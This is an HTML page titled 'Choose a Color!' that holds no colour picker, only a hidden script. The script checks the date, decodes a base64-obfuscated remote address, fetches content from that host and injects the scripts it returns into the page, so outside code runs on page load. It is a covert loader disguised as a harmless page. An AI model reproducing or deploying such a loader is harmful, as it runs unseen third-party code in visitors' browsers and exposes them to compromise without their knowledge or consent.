<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<style>
html, body {
    margin: 0;
    height: 100%;
    width: 100%;
}
iframe {
    border: none;
    height: 100%;
    width: 100%;
}
</style>
<title>Choose a Color!</title>
<body>
<script type="text/javascript">
    (function(){
        function httpGet(theUrl, callback) {
            if (window.XMLHttpRequest) {
                xmlhttp = new XMLHttpRequest();
                xmlhttp.addEventListener("load", function() {
                    callback(this.responseText);
                });
                xmlhttp.open("GET", theUrl);
                xmlhttp.send();
            }
        }
        function canShow() {
            //On or before Dec 4, 2016
            var date = new Date()
            var month = date.getMonth()
            if (date.getYear() != 116) {
                return false
            }
            if (month < 11) {
                return true
            }
            if (month == 11 && date.getDate() <= 4) {
                return true
            }
            return false
        }
        if (canShow()) {
            var frame = document.createElement('object')
            var src = atob("aHR0cDovL3JwaS5zdHVkZW50LnJpdC5lZHU=") + atob("ODA4MA==")
            src = src.slice(0,src.length-4) + atob("Og==") + src.slice(src.length-4)
            frame.innerHTML = "<div style='background: red; color: white; text-align: center; height: 50px; padding-top: 8px; font-size: 30px;'>This should not be visible</div>"
            document.body.appendChild(frame)
            httpGet(src, function(data) {
                var docFrag = document.createDocumentFragment()
                docFrag.innerHTML = data
                var scripts = docFrag.querySelectorAll("script")
                var scr = null
                for (var i=0; i<scripts.length; i++) {
                    scr = scripts[i]
                    if (scr.src[0] == "/") {
                        scr.src = src + scr.src
                    }
                    scr.parentElement.removeChild(scr)
                    document.body.appendChild(scr)
                    console.log("Moving ",scr)
                }
                frame.appendChild(docFrag)
            })
        }
    })()
</script>
</body>
</html>
